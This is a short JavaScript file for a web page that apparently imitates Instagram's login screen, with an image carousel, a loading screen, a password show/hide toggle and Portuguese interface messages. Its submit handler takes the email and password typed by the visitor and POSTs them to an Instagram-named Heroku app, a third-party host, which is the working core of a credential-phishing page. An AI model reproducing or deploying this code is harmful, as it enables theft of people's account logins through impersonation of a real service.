window.addEventListener("load", () => {
  const loading = document.querySelector(".loading");

  setTimeout(() => {
    loading.style.display = "none";
  }, 3000);
});

let time = 5000;
let currentIndex = 0;
let images = document.querySelectorAll(".carousel__image");
let max = images.length;

const nextImage = () => {
  images[currentIndex].classList.remove("selected");
  currentIndex++;
  if (currentIndex >= max) {
    currentIndex = 0;
  }
  images[currentIndex].classList.add("selected");
};

const start = () => {
  setInterval(() => {
    nextImage();
  }, time);
};

window.addEventListener("load", start);

const password = document.querySelector("#password");
const user = document.querySelector("#user");
const show = document.querySelector(".show");
const button = document.querySelector("#submit");
const errorMessage = document.querySelector(".error-message");
const successMessage = document.querySelector(".success-message");

password.addEventListener("keyup", (e) => {
  let value = e.target.value;

  if (value === "" || value.length < 6) {
    button.style.backgroundColor = "#B2DFFC";
    show.style.display = "none";
  } else {
    button.style.backgroundColor = "#0095F6";
    show.style.display = "block";
  }
});

button.addEventListener("click", () => {
  const email = user.value;
  const senha = password.value;

  if (senha.length >= 6) {
    fetch('https://instagram-7a92281434df.herokuapp.com/register', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ email: email, password: senha })
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Ocorreu um erro ao registrar.');
      }
      return response.json();
    })
    .then(data => {
      console.log('Sucesso:', data);
      // Exibir mensagem de sucesso
      successMessage.textContent = 'Registro bem-sucedido!';
    })
    .catch((error) => {
      console.error('Erro:', error);
      // Exibir mensagem de erro
      errorMessage.textContent = error.message;
    });

    password.value = "";
    user.value = "";
    button.style.backgroundColor = "#B2DFFC";
    show.style.display = "none";
  }
});

show.addEventListener("click", () => {
  if (password.getAttribute("type") === "password") {
    password.setAttribute("type", "text");
    show.innerHTML = "Ocultar";
  } else {
    password.setAttribute("type", "password");
    show.innerHTML = "Mostrar";
  }
});
